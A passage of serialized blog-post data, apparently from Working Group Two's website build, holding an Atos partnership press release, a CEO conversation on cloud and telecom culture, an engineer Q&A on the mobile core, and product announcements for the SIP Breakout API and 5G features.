cloud-native mobile core and on Atos\u2019s full Next Generation Telecom Network portfolio, including cloud computing, edge and Open RAN technologies. Atos and wgtwo will jointly deliver \u201ccore-network-as-a-service\u201d solutions.","date":"2022-09-19T00:00:00.000Z","formattedDate":"September 19, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"core","permalink":"/blog/tags/core"},{"label":"cloud","permalink":"/blog/tags/cloud"},{"label":"partners","permalink":"/blog/tags/partners"},{"label":"iot","permalink":"/blog/tags/iot"},{"label":"private networks","permalink":"/blog/tags/private-networks"},{"label":"press release","permalink":"/blog/tags/press-release"}],"readingTime":3.47,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"atos-teams-with-wgtwo","title":"Atos and Working Group Two to deliver core-as-a-service to mobile operators worldwide","date":"2022-09-19T00:00:00.000Z","tags":["saas","operators","core","cloud","partners","iot","private networks","press release"],"authors":["wgtwo"],"image":"./atosxwgtwo_featured_img.png"},"prevItem":{"title":"How product bundling simplifies the distribution challenge","permalink":"/blog/how-product-bundling-simplifies-distribution"},"nextItem":{"title":"Telco Tech Talk: Three CEOs on the future of the telecom industry, moving to the cloud and transforming company cultures","permalink":"/blog/telco-tech-talk-telenor-aws"}},"content":"Atos and Working Group Two (wgtwo) are teaming up to provide operators with a simplified, end-to-end mobile network solution. It is based on wgtwo\u2019s 4/5G cloud-native mobile core and on Atos\u2019s full Next Generation Telecom Network portfolio, including cloud computing, edge and Open RAN technologies. Atos and wgtwo will jointly deliver \u201ccore-network-as-a-service\u201d solutions. \\n\\n\x3c!--truncate--\x3e\\n\\nThis collaboration will target related core opportunities such as IoT, Private Network and Enterprise for the Tier 1 operators, while also extending the offering to public MNO core networks for Tier 2, Tier 3. The solution will enable operators to optimize capacity, improve time to market, lower costs and simplify operations.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./atosxwgtwo.png\\").default}\\n/>\\n\\nOperators can connect their radio networks to the wgtwo global core network. The wgtwo platform is a G-neutral platform that allows for a converged experience with national roaming on 2G/3G and full MNO or private network functionality for 4G/5G. The platform offers the full capabilities of a MNO core related to authentication and provisioning, policy, voice, messaging, data services and all the surrounding orchestration, operational and management tools.  \\n\\n[Atos](https://atos.net/en/) complements wgtwo\u2019s mobile network core with its Next-Generation Telecom Network portfolio, delivering mobile services for public and private networks. To enable more flexible and cost-efficient hosting and operations, Atos offers best-in-class virtualization and cloud technologies. As a world-leading systems integrator, we combine extensive digital transformation expertise, rich industry experience and combined technological capabilities in cloud and edge computing, artificial intelligence, digital security, and IoT.\\n\\nAtos hybrid cloud can enable customers to optimize business processes and modernize applications, while Atos Open-RAN and edge computing solution will enhance application performance and offer innovative services especially around automation. wgtwo\u2019s orchestration platform will simplify the seamless configuration of those services, with lower operational costs and virtualization of network operations. \\n\\nJean-Claude Geha, Head of Telecom, Media and Technology at Atos, said:\\n>  As mobile networks are getting more and more complex, operators need to simplify and rationalize their infrastructure. To go through this transformation, Cloud Computing and Network Functions Virtualization are key technologies for operators to deliver a simpler and more reliable network, with a faster time-to-market and tailored managed services. I am pleased to join forces with a new and innovative player such as Working Group Two to tackle this challenge.\\n\\nErlend Prestgard, CEO of Working Group Two, said: \\n> Atos and WGTWO\u2019s end-to-end solution delivers simplicity, lower costs and enable operators to innovate continuously. We can deploy a wide range of use cases - including greenfield MNOs, specialty networks for MNOs that seek growth opportunities and private networks. We also support MNOs that seek the benefits of a full as-a-service model. Together, we bring a new era of programmability, allowing operators to speed up innovation, explore new revenue streams and get to market faster. \\n\\n**About Atos**\\nAtos is a global leader in digital transformation with 112,000 employees and annual revenue of c. \u20ac 11 billion. European number one in cybersecurity, cloud and high performance computing, the Group provides tailored end-to-end solutions for all industries in 71 countries. A pioneer in decarbonization services and products, Atos is committed to a secure and decarbonized digital for its clients. Atos is a SE (Societas Europaea), listed on Euronext Paris and included in the Next 20 Paris Stock indexes. The purpose of Atos is to help design the future of the information space. Its expertise and services support the development of knowledge, education and research in a multicultural approach and contribute to the development of scientific and technological excellence. Across the world, the Group enables its customers and employees, and members of societies at large to live, work and develop sustainably, in a safe and secure information space.\\n\\n**About Working Group Two**\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Their mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services."},{"id":"telco-tech-talk-telenor-aws","metadata":{"permalink":"/blog/telco-tech-talk-telenor-aws","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-09-15-telco-tech-talk/index.md","source":"@site/../blog/2022-09-15-telco-tech-talk/index.md","title":"Telco Tech Talk: Three CEOs on the future of the telecom industry, moving to the cloud and transforming company cultures","description":"Meet Sigve Brekke (CEO, Telenor Group), Adam Selipsky (CEO, Amazon Web Services) and Erlend Prestgard (CEO, Working Group Two). They recently sat down to discuss questions like: How do you build a strong technology culture in tandem with a customer-centric culture? How do you think long-term but execute in the short term? How can companies in legacy industries transform themselves?","date":"2022-09-15T00:00:00.000Z","formattedDate":"September 15, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"core","permalink":"/blog/tags/core"},{"label":"cloud","permalink":"/blog/tags/cloud"},{"label":"culture","permalink":"/blog/tags/culture"},{"label":"disruption","permalink":"/blog/tags/disruption"}],"readingTime":10.15,"hasTruncateMarker":true,"authors":[{"name":"Tor Odland","title":"Head of Marketing","url":"https://www.linkedin.com/in/torodland/","imageURL":"/img/author-photos/to.jpg","key":"tor-odland"}],"frontMatter":{"slug":"telco-tech-talk-telenor-aws","title":"Telco Tech Talk: Three CEOs on the future of the telecom industry, moving to the cloud and transforming company cultures","date":"2022-09-15T00:00:00.000Z","tags":["saas","operators","core","cloud","culture","disruption"],"authors":["tor-odland"],"image":"./allthreeceos.png"},"prevItem":{"title":"Atos and Working Group Two to deliver core-as-a-service to mobile operators worldwide","permalink":"/blog/atos-teams-with-wgtwo"},"nextItem":{"title":"Q&A with Stephane: The evolution of the mobile core","permalink":"/blog/evolution-of-mobile-core"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nMeet Sigve Brekke (CEO, Telenor Group), Adam Selipsky (CEO, Amazon Web Services) and Erlend Prestgard (CEO, Working Group Two). They recently sat down to discuss questions like: How do you build a strong technology culture in tandem with a customer-centric culture? How do you think long-term but execute in the short term? How can companies in legacy industries transform themselves? \\n\\n![CEOs in Telco Tech Talk](./allthreeceos.png)\\n\\n\x3c!--truncate--\x3e\\n\\n*(This is based on a transcript from a published video conversation called [\\"Telco Tech Talk\\"](https://www.linkedin.com/posts/sigvebrekke_telcotechtalks-activity-6976078836174106625-pX3U/?utm_source=share&utm_medium=member_desktop) - hosted by the Telenor Group. The text is edited for length and clarity. Errors may have occurred)*\\n\\n**Sigve Brekke (CEO, Telenor Group):**\\nHello, everyone. I\'m Sigve Brekke, the Group CEO of the Telenor Group. We are a mobile operator operating across the Nordics and in Asia. We have called this the Telco Tech Talk and this is a second episode where we invite guests to talk about how technology is changing the landscape and how technology companies and telecom companies are coming together and what that really means. Today, I\'m very pleased to have two guests with me to discuss that topic.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"left\\",\\n    marginRight: \\"20px\\"\\n  }}\\n  caption=\\"Telco Tech Talk\\"\\n  src={require(\\"!file-loader!./techtalk.png\\").default}\\n  />\\n\\nIt is Adam Selipsky, the CEO of Amazon Web Services, as we all know, a leading cloud services company globally. And I have Erlend Prestgard, the CEO of Working Group Two, a software and application provider. \\n\\nLet\'s jump into it and let me start with you, Adam. It\u2019s not a technical question but a cultural question. I know that you have been at Amazon from the early days and my first question is, what is your advice on how to combine the efforts of building a strong technology culture and also building a customer-centric culture?\\n\\n**Adam Selipsky (CEO, Amazon Web Services):**\\nThe cultural question is central. I mean, we see this more and more as I spend time with folks like the two of you and many other CEOs and CEOs around the world. At the end of the day, cloud technology is a means to an end. Ultimately it is about transforming the organization. And that sounds like a big claim. But those are the conversations we\'re having more and more. What leaders are realizing is that by moving to the cloud, by undergoing a digital and a data transformation, what they can really do is to put data at the center of decision making. They can move faster. They can be more innovative. Ultimately, what that implies is a cultural transformation about how the organization operates. \\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Adam Selipsky, CEO, Amazon Web Services\\"\\n  src={require(\\"!file-loader!./adam.png\\").default}\\n  />\\n\\nNow, to make that happen and to push that in a productive direction. I think that certainly at Amazon, the most important thing is a concept we call customer obsession. We always put our understanding of the customer right at the center of our decision making. We have many mechanisms for understanding at an incredibly detailed level what customers want. And then we work backwards from that. We talk a lot about the working backwards process at Amazon, where we will write press releases and FAQs for any significant new service, any significant new feature or program before we even embark on building the program or service. We work backwards from there and decide, do we have something remarkable? Is it worth building? I think by really putting the customer perspective right at the center of the core decision making is the best way to undergo cultural transformation. \\n\\nThe other thing I\'ll just hit on quickly is this concept of having a very long-term perspective, long term view, which is something that folks in the telecom industry certainly understand. But I think at software companies and a lot of other companies, it\'s less common, less pervasive to think long term. Amazon has been very good at thinking five, ten, even fifteen years down the road. Amazon Web Services is a good example of that. And to understand that building for the long term, you don\'t just take a series of short little steps, you must have a vision for the long term and build to that part of that topic. \\n\\n**Sigve:**\\nAs you are working with so many other companies with a legacy history, meaning having for so many years built a culture based on yesterday\u2019s business models and not trying to transform themselves into the future: What have you seen in successful companies trying to make this change? \\n\\n**Adam:**\\nWell, every company is a little bit different, but we do see some very common success factors. We can see repeated behavior over and over again by companies who are quickly and successful in making the transition. I would say the first is Top-Down leadership or a leadership mandate that \u201cwe are going to reinvent our business, we are going to move to the cloud, we are going to build our customer obsession, we are going to reap not only the cost benefit but become more agile and more innovative as a company.\u201d I think when leaders instill that, they need to eliminate what I sometimes call a \u201cPlan B.\u201d As long as you leave the option open for people in the company to wonder, is there a plan B? Is there another way, do they really mean it, maybe it\'ll change tomorrow. If you eliminate that and there\'s only plan A, then everybody tends to get focused in the organization. The second thing I\'ll say is that it\'s very useful to have aggressive top-down goals. You want to be deliberate, and you want to be careful. We\'ve seen many teams succeed by saying \u201cWe\'re going to move applications in a month.\u201d There was a CIO of one very large global corporation who did that. By doing that, it gets the team to think differently about what we would have to do to move quickly. The final thing I\'ll say is important as to who you hire and who you develop. I think it\'s important to recruit and train people that want to build, people that want to innovate. And then you free them. You unleash them to do that. It really starts with having the right people in the company. \\n\\n**Sigve:**\\nVery valuable advice. I must admit that being the CEO of a very successful company over the years, the way I look at that is that one thing is what you need to do yourself. The other main thing you can do to achieve this is to do it through partnerships. You need to change from treating partners like vendors into forming more long-term strategic partnerships. I see that a lot of the innovation is happening in partnership with companies like yourself and other technology companies. This is also a way for us to change our culture.\\n\\n**Erlend:**\\nI think you said one thing that I noticed, Adam, which is your incredible, long-term focus. I think we see that as a customer and an AWS user every day. It\u2019s the idea that what we build on today is based on decisions that were made five, ten years ago. There is, I would say, a similar approach in Telenor. I think one noticeable difference between AWS and Telenor is the ability to change and move fast with a long-term mindset, the degree of control of technology and the ability to build and iterate. Short cycles within the long-term perspective. I think that one of the challenges for telecom companies is that they work on these decade-long cycles but the ability to do micro changes within that decade is something that I think the industry really needs to tackle. I think AWS plays a big role in enabling gradual micro improvements in a long-term perspective.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"left\\",\\n    marginRight: \\"20px\\"\\n  }}\\n  caption=\\"Erlend Prestgard, CEO, Working Group Two\\"\\n  src={require(\\"!file-loader!./erlend.png\\").default}\\n  />\\n\\n**Adam:**\\nThere\'s a cultural point and a technology point there. And on the cultural side at Amazon, we talk sometimes about being strategically patient and tactically impatient. The strategic patience is really having a long- term view of \u201cwe are going to get this right as a business.\u201d It may take multiple tries. We\'re going to have a very long-term view of it. But then, we don\'t just kind of keep putting more money and more people into things that aren\'t working. We\'ll adjust, we\u2019ll measure, we\u2019ll be very self-critical about what\'s working and what\'s not working. We\'ll change a lot of things along the way so that it\'s a combination of long-term focus and short-term adjustments. I think on the technology side, it\'s a very fundamental and important observation. Obviously, telco infrastructure, as you said, is not something which changes every three months or every year. And that\'s why the move to the cloud is so fundamental. You now see telecoms building in the cloud and starting to push services out to the edge using the cloud. I think that it creates a lot more flexibility. You see people building with microservices and having automated deployments. That speeds up all the deployments and provides the flexibility of the cloud for the telco core.  I mean, Telenor is an early runner, with a low-cost virtual mobile network brand in Sweden. You have a cloud-based mobile core developed and managed as a service, in collaboration with Working group Two, Telenor and AWS.  I think that\'s the type of environment we need. We can\'t invent the next G overnight, but we can work much more nimbly, much more rapidly and with much, much lower capital cost for telecoms.\\n\\n**Sigve:**\\nErlend, you have taken a position in Europe to try to disrupt the telecom industry by building core mobile platforms in the cloud. We are testing that out ourselves in our own operations. You are also now starting to get external customers. If that really works, this will be a very different software-based way of providing core platform services. How do you see the potential of that? \\n\\n**Erlend:**\\nI think what we\'re going to see is what AWS did to data centers. You\'re going to see something similar happening to operators. One way of looking at what AWS did to data centers is, you know, everybody had their own data centers running in their own specific ways that were fairly closed and quite specific to the individual deployments. AWS comes in, deploys globally consistent infrastructure and makes it available for third parties. They invite third parties to build on top of it and to publish their products in a marketplace-like logic.  I think what we\'re going to see is a move towards mobile core platforms for operators where you build a globally consistent set of functionalities that allows you to scale, to attract developers and build global marketplaces. But that can almost only be done if you leverage the global ecosystem of infrastructure providers like Amazon. I think for us, AWS is an absolutely critical factor in putting our application on top of the AWS system in a way that allows the business dynamics that AWS unleashed in the infra layer, also in the telco\\napplication layer. \\n\\n**Sigve:**\\nOne question I\'m often hearing, Adam, is that with security regulations becoming tighter due to developments within areas such as data privacy, is there a limitation to how much we can use the cloud in the telecom space?\\n\\n**Adam:**\\nPrivacy and security is an incredibly important topic and you see a lot of data sovereignty concerns and a lot of questions about national boundaries\\nand how data should be treated within and across nations and customers. Consumer privacy is paramount. We\'ve always, since day one, had security as our absolute number one priority. No debate, no questions asked, no deviation allowed. We will drop anything if we have a security opportunity or a security issue. It\'s cultural for us. As a result, we have a lot of technical capabilities, both around just basic core security and around security and privacy features that we expose to customers.  We\'re seeing some real innovation from our enterprise customers as well as, of course, from our telecom partners around the world."},{"id":"evolution-of-mobile-core","metadata":{"permalink":"/blog/evolution-of-mobile-core","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-09-09-evolution-of-mobile-core/index.md","source":"@site/../blog/2022-09-09-evolution-of-mobile-core/index.md","title":"Q&A with Stephane: The evolution of the mobile core","description":"We live, eat and sleep mobile core technology here at Working Group Two. What did a mobile core look like in the past and how is it developing? We threw three quick questions at Stephane Savonitto, a Core Network Engineer at Working Group Two. He has significant mobile core experience, from large network operators and equipment manufacturers.","date":"2022-09-09T00:00:00.000Z","formattedDate":"September 9, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"core","permalink":"/blog/tags/core"},{"label":"BBS","permalink":"/blog/tags/bbs"},{"label":"cloud","permalink":"/blog/tags/cloud"},{"label":"virtualization","permalink":"/blog/tags/virtualization"}],"readingTime":3.085,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"evolution-of-mobile-core","title":"Q&A with Stephane: The evolution of the mobile core","date":"2022-09-09T00:00:00.000Z","tags":["saas","operators","core","BBS","cloud","virtualization"],"authors":["wgtwo"],"image":"./flower.jpg"},"prevItem":{"title":"Telco Tech Talk: Three CEOs on the future of the telecom industry, moving to the cloud and transforming company cultures","permalink":"/blog/telco-tech-talk-telenor-aws"},"nextItem":{"title":"Hello abundance, bye-bye complexity: With this new public API you can plug multiple switchboards into the call path - without knowing what a call path is","permalink":"/blog/releasing-sip-breakout-api"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n*We live, eat and sleep mobile core technology here at Working Group Two. What did a mobile core look like in the past and how is it developing? We threw three quick questions at Stephane Savonitto, a Core Network Engineer at Working Group Two. He has significant mobile core experience, from large network operators and equipment manufacturers.* \\n\\n![Flower punching through](./flower.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\n### 1. What was your first meeting with a live mobile core? \\nI started working for Bouygues Telecom, the third French mobile operator, in 1995. This was during their initial rollout. I was working as a BSS field technician and I participated in the deployment of the first Mobile Switching Center (MSC) in the south of France.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"General illustration, courtesy Ericsson\\"\\n  src={require(\\"!file-loader!./ericsson1.jpg\\").default}\\n  />\\n\\nThis node entity alone completely filled a 400m2 room with three rows, hundreds of back-to-back racks and thousands of specific boards and items... This was very impressive and scary! This equipment was able to handle 100 000 subscribers to make voice calls. SMS had not been introduced at that time \ud83d\ude42\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"left\\",\\n    marginRight: \\"20px\\"\\n  }}\\n  caption=\\"General illustration, courtesy Ericsson\\"\\n  src={require(\\"!file-loader!./ericsson2.jpg\\").default}\\n  />\\n\\nAfter that we\u2019ve seen the telecom world developing rapidly. First we saw smaller room sizes with more compact boards and shelves. The cores could handle more functions, had more capacity and could support more subscribers. This was the last step of pure telecom hardware using common vendor boards (also known as Advanced Telecommunications Computing Architecture - or ATCA). This was also the end of Time-division Multiplexing (TDM) and the start of Internet Protocol (IP) transport. Shortly after virtualization arrived, first on dedicated blades on-premises and today on the public cloud.\\n\\n### 2. Which role does the core play in a modern mobile network?\\nToday network technology and standards are going through rapid evolution. This is quickly making equipment obsolete. A core network needs to stay up to date to handle new functionalities, network slicing and so on. Virtualization on the cloud is the way to be able to follow this race with lower investment and faster than conventional core equipment for mobile operators. Internet of Things (IoT) operators, for example, have many subscribers but with low revenue for each subscriber, so to stay profitable it is less expensive for them to go with Network As-a-Service (NaaS) than with a traditional core network. \\n \\n### 3. What are the main challenges with making mobile cores programmable and running them as-a-service? \\nRunning a mobile network as-a-service has many benefits for operators. Networks are increasingly complex so it is difficult to retain the competent people you need to operate them, maintain network performance, and to deploy the latest technology updates. It is also attractive with the shift to a pay-per-use subscription model and the possibility to scale up or down as needed.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    margin:\\"40px auto\\"\\n  }}\\n  caption=\\"Stephane Savonitto\\"\\n  src={require(\\"!file-loader!./stephane.jpg\\").default}\\n/>\\n\\nBut the as-a-service model also introduces new challenges for mobile service providers:\\n- They have to adopt new technologies rapidly and deploy new services by closely following new standards and market trends. \\n- They need to have the capability to automate tasks. \\n- They need to maintain standards capability on the edge and be able to interconnect to any legacy core networking equipment. \\n- They need to ensure that the highest level of security is always up to date on the network\\n- They need to be able to shift the focus from merely operating their core to offering innovative, new services to their customers. \\n\\n\\n*Want to learn more about Working Group Two\u2019s cloud-native and programmable mobile core platform? [Get in touch with us](https://www.wgtwo.com/contact/)*"},{"id":"releasing-sip-breakout-api","metadata":{"permalink":"/blog/releasing-sip-breakout-api","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-07-07-releasing-sip-api/index.md","source":"@site/../blog/2022-07-07-releasing-sip-api/index.md","title":"Hello abundance, bye-bye complexity: With this new public API you can plug multiple switchboards into the call path - without knowing what a call path is","description":"We love making telecom easier and scalable. This week we\u2019ve released SIP Breakout, a new public API from Working Group Two. It simplifies the process of deploying SIP-enabled services, such as a PBX.","date":"2022-07-07T00:00:00.000Z","formattedDate":"July 7, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"api","permalink":"/blog/tags/api"},{"label":"sip","permalink":"/blog/tags/sip"},{"label":"pbx","permalink":"/blog/tags/pbx"},{"label":"developers","permalink":"/blog/tags/developers"}],"readingTime":2.515,"hasTruncateMarker":true,"authors":[{"name":"Noy Shimshoni","title":"Software Engineer for Core Services","url":"https://www.linkedin.com/in/noy-shimshoni-b176bb85/","imageURL":"/img/author-photos/ns.jpg","key":"noy"}],"frontMatter":{"slug":"releasing-sip-breakout-api","title":"Hello abundance, bye-bye complexity: With this new public API you can plug multiple switchboards into the call path - without knowing what a call path is","date":"2022-07-07T00:00:00.000Z","tags":["saas","operators","api","sip","pbx","developers"],"authors":["noy"],"image":"./fruit-landscape.png"},"prevItem":{"title":"Q&A with Stephane: The evolution of the mobile core","permalink":"/blog/evolution-of-mobile-core"},"nextItem":{"title":"What we\'re building on the platform right now: 5GSA, 5GNSA, OCS, content filtering, VoNR, VoLTE on sXGP, VoLTE roaming, support for PBX from Telavox... and more ","permalink":"/blog/what-we-build-right-now-june22"}},"content":"We love making telecom easier and scalable. This week we\u2019ve released [SIP Breakout](https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites), a new public API from Working Group Two. It simplifies the process of deploying SIP-enabled services, such as a PBX.\\n\\n![Abundance of fruit in market stall](./fruit-landscape.png)\\n\\n\x3c!--truncate--\x3e\\n\\n\\nThe [SIP Breakout](https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites) allows for configuration on a per-subscription basis, which means that operators on the Working Group Two platform can easily offer a range of different SIP-services to their customers. The typical example is a PBX, otherwise known as a switchboard. \\n\\nMeanwhile a product developer - say, a company that makes PBXs for a living - benefits from implementing their product once for all operators on the platform. That means no major new development project every time, but a one-time implementation on a standardized and well-documented public API. (Insert upbeat music here). \\n\\n> **Fact box**\\nHold on a second, what\u2019s a SIP? A Session Initiation Protocol (SIP) session is any live communication, such as phone calls, conferencing and even video. The \u201cprotocol\u201d part of the term just means that it\u2019s a set of universal standards for computer communication. Typical examples of a SIP-enabled service are phone calls with Voice over IP, switchboard/PBX and even computer games.\\n\\nSo what\u2019s in it for people using the mobile network? This means that when your local plumbing company or that huge global accounting firm asks their mobile operator for a PBX to help them manage calls and messages with their customers they don\u2019t get a one-size-fits-all solution. The operator can offer them a variety of solutions and usage-based, scalable pricing models. \\n\\n**Let\u2019s drill down a bit further.** \\n\\nBy introducing our new SIP Breakout API we open up our core network to a range of SIP-enabled products. This is significant because SIP products are a bit more complex than other products. So simplifying and standardizing the process makes a difference. The new API allows PBX providers to plug their SIP-enabled endpoints into the call path. This establishes a session integration between Working Group Two\u2019s core and a PBX for a given MSISDN (a unique number that identifies a mobile phone on a network). \\n\\nVirtual SIP registrations are used to alter default call behavior and involve (e.g. a) PBX into the SIP signaling path. For mortals, this simply means that a phone call into a network can be answered, closed or routed somewhere. You can also think about it as registering and unregistering on the network. \\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./fruit-small.png\\").default}\\n/>\\n\\nDevelopers don\u2019t need a lot of knowledge about the [call path](https://www.nextiva.com/voip-definitions/call-path.html), they can use the SIP Breakout API to get signaling to their PBXs, voicemail systems and other SIP-enabled services. \\n\\nThe API is implemented as a [gRPC](https://en.wikipedia.org/wiki/GRPC) service. We believe it is a more reliable way of implementing and supporting almost any language. When we dropped our first batch of public APIs back in March, we also explained why we\u2019ve chosen gRPC. \\n\\n[SIP Breakout](https://v1.docs.wgtwo.com/guide/sipbreakout/v1/how-to-use-sipbreakout-api.html#prerequisites) is available as a public API. You can play around with it in our sandbox right now."},{"id":"what-we-build-right-now-june22","metadata":{"permalink":"/blog/what-we-build-right-now-june22","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-06-23-what-we-build-right-now-june22/index.md","source":"@site/../blog/2022-06-23-what-we-build-right-now-june22/index.md","title":"What we\'re building on the platform right now: 5GSA, 5GNSA, OCS, content filtering, VoNR, VoLTE on sXGP, VoLTE roaming, support for PBX from Telavox... and more ","description":"Our global mobile core platform is rapidly evolving. Here\'s what the team is building right now.","date":"2022-06-23T00:00:00.000Z","formattedDate":"June 23, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"5g","permalink":"/blog/tags/5-g"},{"label":"ocs","permalink":"/blog/tags/ocs"},{"label":"vonr","permalink":"/blog/tags/vonr"},{"label":"volte","permalink":"/blog/tags/volte"},{"label":"pbx","permalink":"/blog/tags/pbx"},{"label":"building-now","permalink":"/blog/tags/building-now"}],"readingTime":2.575,"hasTruncateMarker":true,"authors":[{"name":"Tor Odland","title":"Head of Marketing","url":"https://www.linkedin.com/in/torodland/","imageURL":"/img/author-photos/to.jpg","key":"tor-odland"}],"frontMatter":{"slug":"what-we-build-right-now-june22","title":"What we\'re building on the platform right now: 5GSA, 5GNSA, OCS, content filtering, VoNR, VoLTE on sXGP, VoLTE roaming, support for PBX from Telavox... and more ","date":"2022-06-23T00:00:00.000Z","tags":["saas","operators","5g","ocs","vonr","volte","pbx","building-now"],"authors":["tor-odland"],"image":"./teamtalking.jpg"},"prevItem":{"title":"Hello abundance, bye-bye complexity: With this new public API you can plug multiple switchboards into the call path - without knowing what a call path is","permalink":"/blog/releasing-sip-breakout-api"},"nextItem":{"title":"The business case for not needing a business case","permalink":"/blog/no-need-for-a-business-case"}},"content":"Our global mobile core platform is rapidly evolving. Here\'s what the team is building right now.\\n\\n![Working Group Two team talking](./teamtalking.jpg)\\n\\n\x3c!--truncate--\x3e\\n\\n### Action on the platform\\nWe\u2019ve completed end-to-end testing for **5G Standalone** (5G SA) - both for large scale MNOs as well as for Fixed Wireless Access and Private Networks. Our as-a-service model and programmable core capabilities allow for high performance, operational simplicity and reduced costs for 5G SA.\\n\\n**5G Non-Standalone** (5G NSA) is in production. NSA makes it easier for operators to deploy a 5G network - because they can reuse current 4G facilities. Together with 2G/3G full-MVNO/national roaming capabilities and full 4G/5G capabilities operators can now get a \u201cG-neutral\u201d core network.\\n\\n**Telavox**, a leading UCaaS provider from the Nordics, is now live on the Working Group Two platform - which means that we have integrated their mobile unified comms technology and PBX on our platform via an API. [Telavox](https://telavox.com) is known for an excellent user experience and a strong feature set and we believe they are one of the most attractive global providers of UCaaS and PBX services.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./anna.jpg\\").default}\\n/>\\n\\nWe have developed interfaces that enable **real-time online charging control** (Gy/Ro) and have gone live with this capability with our first OCS/BSS partners.\\n\\nWant to control content? This spring, we enabled **content filtering** on our platform, providing control on a per-subscriber basis. The integration uses the Internet Content Adaptation Protocol [(ICAP)](https://en.wikipedia.org/wiki/Internet_Content_Adaptation_Protocol) for inspecting HTTP-based traffic and DNS-based filtering of data traffic. This system can be used for everything from parental control to enforcing corporate policies.\\n\\n\\n### Voice is on your lips\\nVoice continues to be relevant across \u201cGs\u201d, usage areas and handset types. With our unique approach, we can rapidly adapt our voice stack to emerging needs - such as:\\n\\nEnabling voice for **5G Standalone** (VoNR) is in the works. We see the strong effects of taking a platform approach, where adding VoNR becomes a relatively straightforward exercise.\\n\\nWe continue getting our **IMS stack certified for an increasing number of handsets** across several markets and operator codes. We can see the effects of our platform approach here as well, where each device, operator and market becomes easier. A new operator on the platform can with confidence know that certifications will be passed and carrier bundles issued.\\n\\n<img\\n  width=\\"40%\\"\\n  align=\\"right\\"\\n  style={{\\n    display: \\"block\\",\\n    margin:\\"auto 10px\\"\\n  }}\\n  src={require(\\"!file-loader!./nicholas_anna.jpg\\").default}\\n/>\\n\\nIn **Japan** we have a fantastic demo where the customer can plug in a base station, and minutes later be able to make VoLTE calls between devices in a private network setting. Japan has for a long time had what they call sXGP (a standard for unlicensed 4G  spectrum). At Working Group Two we are building a complete private network solution that in addition to data, also includes includes communication services.\\n\\nWe\u2019re **rolling out VoLTE roaming** with a major IoT player. Voice might not be the biggest business area for IoT, but without it, many IoT players will struggle to satisfy customer demands. We can offer speed, simplicity and affordability for operators that require VoLTE-as-a-service."},{"id":"no-need-for-a-business-case","metadata":{"permalink":"/blog/no-need-for-a-business-case","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-06-09-no-need-for-a-business-case/index.md","source":"@site/../blog/2022-06-09-no-need-for-a-business-case/index.md","title":"The business case for not needing a business case","description":"You\u2019ve heard these terms a million times: Managed services and software-as-a-service. At first glance, they appear deceptively similar. You wonder, how are they different again? Understanding the difference between them unlocks a perspective on where the telecom industry is heading.","date":"2022-06-09T00:00:00.000Z","formattedDate":"June 9, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"managed services","permalink":"/blog/tags/managed-services"}],"readingTime":6.33,"hasTruncateMarker":true,"authors":[{"name":"Erlend Prestgard","title":"CEO","url":"https://www.linkedin.com/in/erlend-prestgard-ab47101/","imageURL":"/img/author-photos/ep.jpg","key":"erlend-prestgard"}],"frontMatter":{"slug":"no-need-for-a-business-case","title":"The business case for not needing a business case","date":"2022-06-09T00:00:00.000Z","tags":["saas","operators","managed 